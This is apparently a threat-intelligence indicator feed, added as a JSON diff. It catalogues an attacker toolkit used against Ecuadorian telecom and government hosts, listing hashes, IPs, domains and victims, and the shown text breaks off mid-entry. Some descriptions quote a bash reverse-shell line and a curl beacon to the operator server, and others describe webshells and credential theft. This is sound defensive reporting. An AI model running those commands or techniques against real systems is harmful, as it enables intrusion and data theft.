@@ -1,0 +1,1148 @@
+{
+  "metadata": {
+    "malware_name": "WebLogic Deserialization and Telecom Credential Harvesting Toolkit",
+    "family": "None. Bespoke operator toolkit combining hand-written WebLogic T3/JNDI tooling, unmodified public CVE exploits, tunnelling utilities, webshells and a userland rootkit staging set",
+    "campaign_id": "WebLogicDeserialization-TelecomHarvester-13.140.145.210",
+    "report_date": "2026-08-17",
+    "analyst": "The Hunters Ledger",
+    "confidence": "HIGH",
+    "tlp": "CLEAR",
+    "threat_level": "HIGH",
+    "description": "Indicators from an open directory on 13.140.145.210:8888 holding 169 unique operator files. One compromise is confirmed victim-side: a Cisco ISR 1100 running IOS-XE 16.6.4 was accessed via CVE-2023-20198 plus the CVE-2023-20273 double-encoded WSMA path bypass and made to upload 424,946,514 bytes across 100 HTTP PUTs on 2026-07-24 with the victim device itself as HTTP client. Targeting is Ecuadorian telecommunications and government infrastructure.",
+    "evidence_sources": "Union of Hunt.io AttackCapture (2026-07-16/23) and a Vantage archive (2026-08-03), all SHA256-verified",
+    "defanging": "None applied. This feed is machine-readable. The one exception is the third-party API key under credentials, which is deliberately truncated.",
+    "credential_redaction": "Victim-side credential literals are withheld from this public feed and held only in the investigation record. Attacker-side and public vendor-default credentials are published. Redacted entries carry a redaction_note explaining what was withheld and why."
+  },
+  "file_hashes": {
+    "sha256": [
+      {
+        "value": "953b668e95e033b34de0373af354cfd1d5557edf8cdfa49887cabf2b44d67b65",
+        "filename": "cve21839",
+        "type": "ELF64 Go binary",
+        "confidence": "DEFINITE",
+        "description": "Public CVE-2023-21839 WebLogic T3/IIOP exploit, Go 1.22.2, pristine checkout (vcs.modified=false), upstream VCS revision 29b0cf99882c216e4814d1e23f10216895896dd8"
+      },
+      {
+        "value": "891c4bb6b5c94b28867535c1ec71561be75b30da47554fbf6d55ae7f0d86be8b",
+        "filename": "wl_exploit",
+        "type": "ELF64 Go binary",
+        "confidence": "DEFINITE",
+        "description": "Same public tool built from a dirty tree. Byte diff versus cve21839 is 106 of 3,008,878 bytes, all build metadata. Exploit code is byte-identical to pristine"
+      },
+      {
+        "value": "a133809a768c7c6b958d72ff6857677b14ed6bf284b99dc81a121442dfe04f90",
+        "filename": "df_exploit",
+        "type": "ELF64 native C binary",
+        "confidence": "DEFINITE",
+        "description": "Public Dirty Frag Linux kernel LPE (CVE-2026-43284 + CVE-2026-43500), compiled unmodified from exp.c with GCC Ubuntu 13.3.0-6ubuntu2~24.04.1"
+      },
+      {
+        "value": "ee2d150a2f73a561983088a6b1a6a2b1c452777aaf03181387708c6907ac6dcd",
+        "filename": "exp.c",
+        "type": "C source, 1951 lines",
+        "confidence": "DEFINITE",
+        "description": "Dirty Frag LPE source. Three concatenated public proof-of-concept bodies plus an operator dispatcher"
+      },
+      {
+        "value": "daee2d57566c88374b5de65ecc04e1321da4d5dc35b84a0eb98893afad9e2664",
+        "filename": "orig_bins.tgz",
+        "type": "gzip tar archive",
+        "confidence": "DEFINITE",
+        "description": "Userland rootkit originals-backup containing pristine bin/ps, usr/bin/top, usr/bin/pstree, bin/netstat, usr/sbin/lsof, usr/bin/find, bin/rpm (RHEL5-era, 2007-2010)"
+      },
+      {
+        "value": "72c6383477bbcb93811fd837a9e4721cfddea0cd238eebe3012acc0e6a31c40e",
+        "filename": "exfil_nvram.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Cisco IOS-XE WSMA fileCopy exfiltration script. Carries the forged 18-hex token and the double-encoded WSMA path"
+      },
+      {
+        "value": "5f2efa79f548b648a318e6c6f3512581574002b79fab97cfec10b77feba177b8",
+        "filename": "serve_http.log",
+        "type": "Operator listener log",
+        "confidence": "DEFINITE",
+        "description": "Victim-side receipt of 100 PUT events totalling 424,946,514 bytes from 200.24.221.122 on 2026-07-24"
+      },
+      {
+        "value": "80b9a4c5cde7f1793b4123662b2dddc2b3801e09fdc7ed8c295e10bad3397b9b",
+        "filename": "exfil_capture.log",
+        "type": "Raw TCP capture log",
+        "confidence": "DEFINITE",
+        "description": "Independent capture of the same victim traffic. Source of the User-Agent: cisco-IOS marker and of the radius-sync.com origin unmasking"
+      },
+      {
+        "value": "6ce28a27af3bf7732952461c6d6003c53ee0c367563f941b8dd481aefa2e7454",
+        "filename": "exfil_cores_batch.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "Core-dump exfiltration and credential-cracking log. 21 candidate passwords, all rejected, zero Auth= tokens recovered"
+      },
+      {
+        "value": "395d83618e1ad08a61a70405f9c41f38202ad273ec2f748017a934c5a5020a32",
+        "filename": "lua_source.txt",
+        "type": "Text",
+        "confidence": "DEFINITE",
+        "description": "Lua source and crash traces carved from the victim router core dumps, including smgmt_parse_auth_hdr crashes and the WebUI credential-check handler"
+      },
+      {
+        "value": "a71223b4b7d092f5a0cbcece6df94f907572f090c5db6bb68bcaaeb077c744d7",
+        "filename": "extract_lua_src.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Core-dump Lua source carver with Spanish comments"
+      },
+      {
+        "value": "57808e07ba7745a2d598f630db9c6a671fe5cca005c6dbf4239b8ad794277143",
+        "filename": "prtg_extract.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Seven-stage PRTG credential harvest and notification-program RCE against 181.112.150.104"
+      },
+      {
+        "value": "9f2302cd9698895ac3d83e44fc0b3c99767cc1561bb18de6a2fb31acb5c15feb",
+        "filename": "shodan_full.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "CNT EP target-selection reconnaissance. ~55 queries all scoped to org CNT EP, includes an SS7/Diameter/GTP/SMPP signalling block and a hard-coded Shodan API key"
+      },
+      {
+        "value": "d2ba9a1859464c4f08c47643d2e157400a94b31b429d4415acb4389944ee016a",
+        "filename": "tmp_jndi_rce.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Hand-written 4-mode BER/LDAP JNDI exploitation server (reference, beanfactory, serialized, resourceref) with JRMP fallback"
+      },
+      {
+        "value": "45534cd8555fb79ebae27aaea8a6fbaec70d41ef5d9bc0a9415ed72e7ad23b00",
+        "filename": "tmp_docker_21182.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Builds the CVE-2024-21182 technique inside a vulhub/weblogic:12.2.1.3-2018 container to obtain a real weblogic.jar classpath"
+      },
+      {
+        "value": "25e713913758006835da0c0aa3aa621c37e21498114dadc8c4a8c00d6997d99b",
+        "filename": "docker_output.txt",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "Records the CVE-2024-21182 RCE attempt against 181.112.229.138:7001 failing on every callback listener"
+      },
+      {
+        "value": "fa433bbbc82c572c838ac6a9f0bdde3634c8fbae4178d3660bf0dcb1a958e262",
+        "filename": "fix_radius.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Drives a custom C2 console on 127.0.0.1:19999 to a root@radius01 session, rewrites the AAA watchdog and timestomps it to 2010-10-07"
+      },
+      {
+        "value": "10ff5a12a4380e7e3209cd2c1cab14c1329160fb88d0ede2e4450e8ade6f4b79",
+        "filename": "check_control.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Syntactically broken earlier draft of the C2 console client logic"
+      },
+      {
+        "value": "6457ff57de0ee5b12abf6e3c8291e69718ea6ded741af51807259c692e7071c5",
+        "filename": "i786.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "SOCKS-proxied SSH pivot to root@200.107.12.110 with sysgad_key, then reconnaissance of SYS-GAD 200.107.7.86"
+      },
+      {
+        "value": "bfb79c2d47b7bbd0cfc17782014eb7a57b73834ab93d49d7dd1e6942693ac8f2",
+        "filename": "so.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "SAM and SYSTEM hive theft via the h.php webshell, staged into the web root then deleted at both ends"
+      },
+      {
+        "value": "676437728db9710c645d509d7ccc517864a263914f9a152c1d49cad3106df900",
+        "filename": ".wr.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "WinRM New-PSSession primary and IPC$ fallback credential spray against 192.168.10.1, objective route print filtered for 172.x"
+      },
+      {
+        "value": "fd628df5bf58c7abaebfca3ecfe504511080872bf1687ec2dd39d1d4cd3f0aab",
+        "filename": ".en.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Internal enumeration of 192.168.10.1 via the GeoServer RCE and an ephemeral x.php webshell"
+      },
+      {
+        "value": "dcd739dfe08285c08200be926905155576bedc4e5633b5f02561ec7f80d512f1",
+        "filename": ".gs.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "GeoServer default-credential test and CVE-2024-36401 OGC-filter RCE test against CATASTRO"
+      },
+      {
+        "value": "ce2bb74025dc77d4d5c506b990633f526f4f3f4ca849db7c0025d42d10a8529a",
+        "filename": "decrypt3des.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "GeoServer datastore-password decryption against the default master password, targets named postquininde and alt"
+      },
+      {
+        "value": "19957b57916b3133fd69ca925304b1260c92d1f3b6857bcb9b48606b583a6455",
+        "filename": "aexp/cmd.jsp",
+        "type": "JSP webshell",
+        "confidence": "DEFINITE",
+        "description": "Runtime.getRuntime().exec with /bin/bash -c on the cmd request parameter. The /bin/bash invocation confirms a Linux WebLogic target"
+      },
+      {
+        "value": "9251373f585c91b6bf7c407aa1a989e7cc596c4afc79a8573a18f858df9f014d",
+        "filename": "string_payload.bin",
+        "type": "Java serialized String",
+        "confidence": "DEFINITE",
+        "description": "22-byte serialized String hello_from_ldap used to validate the LDAP/JNDI callback path"
+      },
+      {
+        "value": "5a8aa26793cc031314eba327f40e384e2e0d009a7183e344e5db11f2cd3b185f",
+        "filename": "iiop_resp.bin",
+        "type": "HTML",
+        "confidence": "DEFINITE",
+        "description": "Mislabelled. Actually a captured WebLogic HTML error page, HTML 4.0 Draft doctype"
+      },
+      {
+        "value": "08ae961db6b2564e26ba55ebe8aaf31920dc418b55010b0a2401ed995552c347",
+        "filename": "GenBypass.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Wraps a CommonsCollections6 payload as SignedObject, TextMessageImpl, ObjectMessageImpl and ObjectMessage+CC6 to bypass WebLogic deserialization filtering"
+      },
+      {
+        "value": "4bb64940f1f08d23a5b0733369a40f349dce28a8e677577e44dbf0d61ceb6faf",
+        "filename": "CVE_2024_21182.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "AggregatableOpaqueReference referent reflection plus spoofed MessageDestinationReference. The same ~20-line block is copy-pasted byte-identically across seven operator files"
+      },
+      {
+        "value": "9bebcc8ccfb9207b8265c85a4896760b8adee5deea0c2f57e6b08fc56a29e2ec",
+        "filename": "exploit21182.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "CVE-2024-21182 server-side JNDI resolution variant"
+      },
+      {
+        "value": "c17736b8535359e385fdc3e242d2a36c3b921469229c256947695a4716ad0e4d",
+        "filename": "xds.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Extracts database credentials from jdbc/OpssDataSource, jdbc/AuditAppendDataSource and jdbc/AuditViewDataSource via the WebLogic server's own connections"
+      },
+      {
+        "value": "dbbdffa94caf45a4c1f9132fa7c5bfc6a4c20ee104440ba964cc99ea9850facb",
+        "filename": "xscan.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Threaded blind internal port scanner through WebLogic server-side JNDI resolution timing"
+      },
+      {
+        "value": "fa930afe099b266006f22fe75245f4d52b52a11de7280b6c2cff8e3a4e4b3e06",
+        "filename": "SsrfT3.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Hard-codes 181.112.229.138 and sweeps internal services including rmi://200.107.9.80 labelled radius01"
+      },
+      {
+        "value": "65bd20aa232157ee4015e1d5b8939e953db0dd69a3c86a7387a33aedd2288b85",
+        "filename": "wl_jars/WLExploit.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Operator-written T3 client with enum, bind and lookup actions. The CVE-2023-21839 trigger"
+      },
+      {
+        "value": "5182ec0b8959cc554c8f3e06e8fad7a94b71f11de29d7c9c462fb500ef9d33bb",
+        "filename": "wl_jars/T3Exploit.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "JNDI injection driver with 181.112.229.138 7001 hard-coded as its example"
+      },
+      {
+        "value": "4d53fc510a54cc1d3f9f6e8c14cb62bb784267ebcf15b6fc4126901fd81c32cc",
+        "filename": "rce_class/ExploitClass.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Reverse shell payload: bash -i >& /dev/tcp/13.140.145.210/4445 0>&1"
+      },
+      {
+        "value": "4430563acc3e61903969f077fa2f868cc75158ec6719abb4031c115aa7e895ab",
+        "filename": "xclass/ExploitClass.java",
+        "type": "Java source",
+        "confidence": "DEFINITE",
+        "description": "Beacon payload: curl http://13.140.145.210:4445/CLASS-RCE-$(whoami)"
+      },
+      {
+        "value": "58475dcbda931c31e45a83884e366a28b34aaa9099bab8b2e38590824e3b61b3",
+        "filename": "rce_class/ExploitClass.class",
+        "type": "Java class",
+        "confidence": "DEFINITE",
+        "description": "Compiled reverse-shell payload class"
+      },
+      {
+        "value": "a93d8af6748c9c8ff1dbdffeed317cf81fe7777f25daf5c8feb44aa64d600463",
+        "filename": "ssrf_results.txt",
+        "type": "nmap output",
+        "confidence": "DEFINITE",
+        "description": "Real nmap output with microsecond latencies, run from an internal CNT foothold. Sections labelled RADIUS01, BNG RANGE, VGW RANGE, BACKBONE, MSC LOCAL NETWORK, DOCKER NETWORK"
+      },
+      {
+        "value": "403aad5736161e9b36c4f2c9a4451d0146b870c76627cc0afb28f2c038ab9af2",
+        "filename": "movistar_wordlist.txt",
+        "type": "Text, 52027 lines",
+        "confidence": "DEFINITE",
+        "description": "Bespoke credential list seeded on Vernaza Grafic, Movistar/Otecel/Telefonica, Cisco enable/secret terms, and the carrier OSS/BSS names netcraker and cgrc"
+      },
+      {
+        "value": "7477eea61182c26fdd26e688bcc4f6ae87347e9a9290b81aae21b2fd71db0984",
+        "filename": "combined_wordlist.txt",
+        "type": "Text, 55576 lines",
+        "confidence": "DEFINITE",
+        "description": "movistar_wordlist merged with keyboard-pattern filler. Per-seed counts identical to movistar_wordlist"
+      },
+      {
+        "value": "1766fd750011ad5d3b4f98357acb418f8ee07587c558c7fbe5169b7f3d8285c0",
+        "filename": "hybrid_wordlist.txt",
+        "type": "Text, 77360 lines",
+        "confidence": "DEFINITE",
+        "description": "Leetspeak list built around the registered legal name vernazagraficcltda plus device terms iosxe and router"
+      },
+      {
+        "value": "f03e4111413befd8e44035c7fa56abf48fb12a0d03a6eda5662de33ffe47e2e7",
+        "filename": "sph_cve.txt",
+        "type": "Captured HTML page",
+        "confidence": "DEFINITE",
+        "description": "CESLI portal of SEIBE, Ecuador Ministry of Education. Saved by the operator under a _cve filename. Byte-identical duplicate saved as sph_admin.txt"
+      },
+      {
+        "value": "1f135e2ede4d2389e481d51d046e533ac485d15dc83396818d41bb81c7e84045",
+        "filename": "wl_t3.txt",
+        "type": "Captured HTTP response",
+        "confidence": "DEFINITE",
+        "description": "Genuine Oracle WebLogic Error 404 page from 181.112.229.138:7001. Byte-identical duplicate saved as wl_14882.txt"
+      },
+      {
+        "value": "885cfb5bfd041b8efd885860add9661eeab6086d2eb91997fffc420738e42ade",
+        "filename": "wl_resp.txt",
+        "type": "Captured HTTP response",
+        "confidence": "DEFINITE",
+        "description": "Genuine Oracle WebLogic Error 401 Unauthorized page. Confirms a real WebLogic on port 7001 refused the operator"
+      },
+      {
+        "value": "610ff467df7cf2ea672762f4fd63c9a817b7d5f18f290efe8bdf239ddc8031f7",
+        "filename": "t35.txt",
+        "type": "Captured HTML page",
+        "confidence": "DEFINITE",
+        "description": "SSL-VPN appliance user portal captured as target number 35, implying a target list of at least 35 entries"
+      },
+      {
+        "value": "fa434d13bee84e9a4ccfffbd8df2852d9d1238f8222bf806506b108d21924557",
+        "filename": "c.pem",
+        "type": "X.509 certificate",
+        "confidence": "DEFINITE",
+        "description": "Operator self-signed certificate CN=13.140.145.210, generated 2026-07-24 12:50:23 UTC, same day as the router theft"
+      },
+      {
+        "value": "7b699b24025e3d71fd83dd766c7b842579cf28527f22a8fd5c9097ceaa7a013d",
+        "filename": "k.pem",
+        "type": "Private key",
+        "confidence": "DEFINITE",
+        "description": "Private key for the operator certificate above"
+      },
+      {
+        "value": "1351c03f626745cacd97f957419559da442264c0e0c4b100f496199dbd6301cc",
+        "filename": "pkg_names.txt",
+        "type": "Text",
+        "confidence": "DEFINITE",
+        "description": "Names procps-3.2.7-16.el5.i386.rpm and psmisc-22.2-7.i386.rpm, the packages providing the binaries backed up in orig_bins.tgz"
+      },
+      {
+        "value": "5ce9cdc2d2d5f5fd053ef7438626a9c98bc92ecc1eb2960fc6cffdc94e0ab550",
+        "filename": "r.bat",
+        "type": "Windows batch",
+        "confidence": "DEFINITE",
+        "description": "Minimal Windows reconnaissance drop writing to out.txt"
+      },
+      {
+        "value": "fae8fe13ac0e717d99f992fba9186aa37fb706058fe7762993717366f653d14a",
+        "filename": "vps_bench.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Citibanamex password-reset endpoint probe, customerId iteration at escalating concurrency"
+      },
+      {
+        "value": "626856f44bba5e61c878c2e2be54f3aa12a2fdee602634706917bc77aaaa4ef5",
+        "filename": "vps_bench2.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Second Citibanamex probe variant capturing HTTP status codes"
+      },
+      {
+        "value": "9e683ccc4baa5efdf4b643ade417cf56b729c5da1d351495d4317272b15f925f",
+        "filename": "vps_bench3.sh",
+        "type": "Shell script",
+        "confidence": "DEFINITE",
+        "description": "Third Citibanamex probe variant, concurrency escalated to 500"
+      },
+      {
+        "value": "e788f829b1a0141a488afb5f82b94f13035623609ca3b83f0c6985919cd9e83b",
+        "filename": "chisel_win.exe",
+        "type": "PE64 Go binary",
+        "confidence": "DEFINITE",
+        "description": "Stock jpillora chisel v1.23.1 windows/amd64. Pulled by CNT host 200.107.12.110 from the operator staging server on 2026-07-13",
+        "false_positive_risk": true,
+        "false_positive_note": "Chisel is a legitimate open-source tunnelling tool with genuine administrative uses. Detect the reverse-tunnel behaviour and the staging fetch, not the hash alone"
+      },
+      {
+        "value": "0a76c28f5452dbbc146752d0b4e28b10779a337091f59650b94f5e938545572c",
+        "filename": "chisel_linux",
+        "type": "ELF64 Go binary",
+        "confidence": "DEFINITE",
+        "description": "Stock jpillora chisel v1.23.1 linux/amd64",
+        "false_positive_risk": true,
+        "false_positive_note": "Same caveat as chisel_win.exe"
+      },
+      {
+        "value": "e5621ffe4879f0ec39ed40f688db9399c2d43054d41ef14472fa335c4693b915",
+        "filename": "plink.exe",
+        "type": "PE32 executable",
+        "confidence": "DEFINITE",
+        "description": "Stock PuTTY plink. Pulled by CNT host 200.107.12.93 from the operator staging server on 2026-07-13",
+        "false_positive_risk": true,
+        "false_positive_note": "PuTTY plink is legitimate administrative software. Context is the external staging fetch onto a management host"
+      },
+      {
+        "value": "53517fdc0d386c7dfd4546e9e83150f85dab0662dbcaf9bf0f9dd82fab3a07e9",
+        "filename": "JNDIExploit.jar",
+        "type": "Java archive",
+        "confidence": "DEFINITE",
+        "description": "welk1n public JNDI attack server, VT 27/64. Reused here as the LDAP/RMI callback server on port 1389 for WebLogic JNDI injection, not as a Log4Shell attack"
+      },
+      {
+        "value": "628e3af996c506671d978026496c28e2ec0b4bc3a91302257d3b508d1ebd61f6",
+        "filename": "weblogic-t3-exploit/weblogic_t3.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Public CVE-2020-2555 WebLogic Coherence gadget tool (com.supeream, Y4er). Staged, no firing evidence"
+      },
+      {
+        "value": "a652e3ae426e614844a5970154cb2a2e1465ab6fe73bbd3df47abeb6bdf859eb",
+        "filename": "poc21839.py",
+        "type": "Python script",
+        "confidence": "DEFINITE",
+        "description": "Public houqe CVE-2023-21839 proof of concept, downloaded by tmp_jndi_rce.sh"
+      },
+      {
+        "value": "1079a2f628fd6a33dae90515ecebecabf66eb3952c39635fd495dd3718173f64",
+        "filename": "http80.log",
+        "type": "Operator staging-server log",
+        "confidence": "DEFINITE",
+        "description": "Records CNT hosts 200.107.12.110 and 200.107.12.93 fetching chisel_win.exe and plink.exe on 2026-07-13. Victim-side evidence of the internal foothold"
+      },
+      {
+        "value": "35792ca59beddfc9905c06c1a22b35b367d4f39083a0e59aea3a197f33af36e0",
+        "filename": "chisel443.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "chisel server on port 443 with reverse SOCKS session establishment"
+      },
+      {
+        "value": "4e722db95bf034806bf181f11065c6cb28578074b9fa613fd5018d1370db7ba2",
+        "filename": "chisel80.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "chisel server on port 80 with SOCKS session"
+      },
+      {
+        "value": "04dbe46cf060c2de75ff04a13b0f2b48253c1b03a638a2afdae3cccdeeae500c",
+        "filename": "chisel_new.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "Additional chisel sessions, source of two of the four server key fingerprints"
+      },
+      {
+        "value": "e74276ce204476787aaa65c0f0604707c918a06b724ceaa98eb57f2105c65157",
+        "filename": "chisel_server.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "chisel server startup log"
+      },
+      {
+        "value": "abcb8e8bd371549af056f973b95cceae9156b5b96e80facbc19db009347b2924",
+        "filename": "proxychains_chisel.conf",
+        "type": "Config",
+        "confidence": "DEFINITE",
+        "description": "proxychains config pointing at the local SOCKS listener 127.0.0.1:1080"
+      },
+      {
+        "value": "3fbfafab2e467055e22cf88719f081770fda732c278ad7244c938308f6b28c96",
+        "filename": "proxychains_catastro.conf",
+        "type": "Config",
+        "confidence": "DEFINITE",
+        "description": "proxychains config chaining onward to the internal CATASTRO target"
+      },
+      {
+        "value": "75f99724611c680400f2ba567b71522a63122b0510ea7ef35c2696dd61666ecf",
+        "filename": "jndi_cb.txt",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "JNDI callback listener on port 4445 recording no inbound connection"
+      },
+      {
+        "value": "e447cbfbb5e82bd6b924cd6d9265d022a9ab576898c34ee6b854b9269ff9e870",
+        "filename": "aexp/dtd_server.log",
+        "type": "Operator log",
+        "confidence": "DEFINITE",
+        "description": "Leaks the name of an unarchived CNT/Andinanet script: /tmp/andinet.sh line 122"
+      }
+    ]
+  },
+  "network_indicators": {
+    "ipv4": [
+      {
+        "value": "13.140.145.210",
+        "role": "Operator VPS and collection point",
+        "ports": [
+          22,
+          53,
+          80,
+          443,
+          1389,
+          4445,
+          8080,
+          8443,
+          8888
+        ],
+        "asn": "AS51167",
+        "hosting": "Contabo GmbH, network 13.140.128.0/18, RIPE, Lauterbourg France",
+        "rdns": "vmi3432966.contaboserver.net",
+        "first_seen": "2026-06-08",
+        "last_seen": "2026-08-16",
+        "confidence": "DEFINITE",
+        "action": "BLOCK",
+        "notes": "Open directory on :8888 closed 2026-08-04; host still answering on :22 as of 2026-08-16 with a new :53 listener first observed 2026-08-10. VT 0/91. Shodan geolocation for this address is wrong (reports US/Dallas/SoftLayer from a stale legacy registration on the 13.x block); VT, Censys and rDNS agree on Contabo France"
+      },
+      {
+        "value": "95.214.114.37",
+        "role": "Operator attack-source VPN exit",
+        "asn": "AS136787",
+        "hosting": "PacketHub S.A., geolocated Ecuador",
+        "confidence": "HIGH",
+        "action": "MONITOR",
+        "notes": "Attributed by the byte-identical double-encoded WSMA path appearing in the victim router's own nginx log on 2026-07-24. VT 1/91",
+        "false_positive_risk": true,
+        "false_positive_note": "Commercial VPN/proxy egress range. Other tenants use the same infrastructure. Do not treat co-located activity as this operator's"
+      },
+      {
+        "value": "200.24.221.121",
+        "role": "VICTIM - Cisco ISR 1100 management address, IOS-XE 16.6.4, hostname VERNAZA_GRAFIC_MATRIZ",
+        "asn": "AS19114",
+        "hosting": "Otecel S.A. (Movistar Ecuador)",
+        "confidence": "DEFINITE",
+        "action": "HUNT",
+        "notes": "Confirmed compromised via CVE-2023-20198 plus the CVE-2023-20273 double-encode WSMA bypass. This is a victim address, not operator infrastructure. Do not block"
+      },
+      {
+        "value": "200.24.221.122",
+        "role": "VICTIM - egress address of the same site, source of all 100 exfiltration PUTs",
+        "asn": "AS19114",
+        "hosting": "Otecel S.A. (Movistar Ecuador)",
+        "confidence": "DEFINITE",
+        "action": "HUNT",
+        "notes": "Sophos appliance whose certificate issuer is Vernaza Grafic. Victim address, do not block"
+      },
+      {
+        "value": "192.168.1.6",
+        "role": "VICTIM - IOSd internal web backend on the compromised router",
+        "confidence": "DEFINITE",
+        "action": "HUNT",
+        "notes": "RFC1918 address internal to the victim device. Context only",
+        "false_positive_risk": true,
+        "false_positive_note": "Private address space. Meaningful only in the context of an IOS-XE WebUI nginx upstream"
+      },
+      {
+        "value": "200.107.12.110",
+        "role": "VICTIM - CNT EP host, internal foothold and SSH jump host",
+        "asn": "AS28006",
+        "hosting": "CNT EP",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Fetched chisel_win.exe from the operator staging server on 2026-07-13 19:51 and connected back as a reverse SOCKS tunnel"
+      },
+      {
+        "value": "200.107.12.93",
+        "role": "VICTIM - CNT EP host staged with plink.exe",
+        "asn": "AS28006",
+        "hosting": "CNT EP",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Fetched plink.exe from the operator staging server on 2026-07-13 19:59"
+      },
+      {
+        "value": "200.107.9.80",
+        "role": "VICTIM - CNT EP radius01 AAA/RADIUS server",
+        "asn": "AS28006",
+        "hosting": "CNT EP",
+        "rdns": "80.9.107.200.static.anycast.cnt-grms.ec",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Most prioritised single target in the corpus, appearing across three unrelated tool families. Reachability is victim-side confirmed; the root session is operator-side inference only and is held at MODERATE"
+      },
+      {
+        "value": "200.107.7.86",
+        "role": "VICTIM - CNT-internal host labelled SYS-GAD by the operator",
+        "asn": "AS28006",
+        "hosting": "CNT EP",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Reconnaissance target of i786.sh. No exploitation observed"
+      },
+      {
+        "value": "181.112.150.104",
+        "role": "VICTIM - CNT EP PRTG monitoring server, build 24.1.90.1306",
+        "asn": "AS28006",
+        "hosting": "CNT EP",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Targeted by prtg_extract.sh with hard-coded prtgadmin credentials. Compromise UNCONFIRMED, no captured output. TLS certificate *.bomberosquito.gob.ec indicates a monitored-entity relationship, which is collateral context not a demonstrated target"
+      },
+      {
+        "value": "181.112.229.138",
+        "role": "TARGET - WebLogic on port 7001, attack FAILED",
+        "asn": "AS28006",
+        "hosting": "CNT EP allocation, ISP of record Danrema S.A. GAD Municipal de Nabon environment",
+        "confidence": "DEFINITE",
+        "action": "HUNT",
+        "notes": "CVE-2024-21182 attempt failed with three independent confirmations: 401, 404, and no callback on any listener. Confirmed defensive success by the target. Edge device is MikroTik RouterOS 6.49.15 fronting Proxmox VE with cluster certificate CN=proxmox.nabon"
+      },
+      {
+        "value": "192.168.10.12",
+        "role": "VICTIM - internal host labelled CATASTRO, WAMP plus GeoServer :8080",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Assessed as the cadastre server of GAD Municipal de Quininde. Two PHP webshells present",
+        "false_positive_risk": true,
+        "false_positive_note": "Private address space, meaningful only with the webshell and GeoServer context"
+      },
+      {
+        "value": "192.168.10.1",
+        "role": "TARGET - internal lateral-movement target of the WinRM and IPC$ spray",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "No success artifact exists",
+        "false_positive_risk": true,
+        "false_positive_note": "Private address space, extremely common gateway address"
+      },
+      {
+        "value": "104.21.41.159",
+        "role": "Cloudflare proxy A record for radius-sync.com",
+        "confidence": "LOW",
+        "action": "MONITOR",
+        "notes": "Resolution context only",
+        "false_positive_risk": true,
+        "false_positive_note": "Shared Cloudflare edge infrastructure serving millions of unrelated sites. Never block"
+      },
+      {
+        "value": "172.67.148.55",
+        "role": "Cloudflare proxy A record for radius-sync.com",
+        "confidence": "LOW",
+        "action": "MONITOR",
+        "notes": "Resolution context only",
+        "false_positive_risk": true,
+        "false_positive_note": "Shared Cloudflare edge infrastructure serving millions of unrelated sites. Never block"
+      }
+    ],
+    "ipv6": [],
+    "domains": [
+      {
+        "value": "radius-sync.com",
+        "role": "Operator-owned domain",
+        "created": "2026-07-11",
+        "registrar_expiry": "2029",
+        "nameservers": [
+          "paloma.ns.cloudflare.com",
+          "peyton.ns.cloudflare.com"
+        ],
+        "confidence": "HIGH",
+        "action": "BLOCK",
+        "notes": "Origin 13.140.145.210 unmasked from the operator's own capture log, which records Cloudflare edge addresses delivering Host: radius-sync.com and cf-ray headers to the VPS. VT 0/91. Named to impersonate telecom AAA infrastructure. WHOIS privacy applied approximately four minutes after registration"
+      },
+      {
+        "value": "certificacion.educacionbilingue.gob.ec",
+        "role": "TARGET - Ecuador Ministry of Education, SEIBE CESLI portal",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Landing page captured by the operator under a _cve filename. Compromise UNKNOWN"
+      },
+      {
+        "value": "nube.educacionbilingue.gob.ec",
+        "role": "TARGET - Ecuador Ministry of Education",
+        "confidence": "HIGH",
+        "action": "HUNT",
+        "notes": "Appears in the same captured page. Compromise UNKNOWN"
+      },
+      {
+        "value": "bancanet.banamex.com",
+        "role": "TARGET - Citibanamex password-reset endpoint",
+        "confidence": "HIGH",
+        "action": "HUNT",
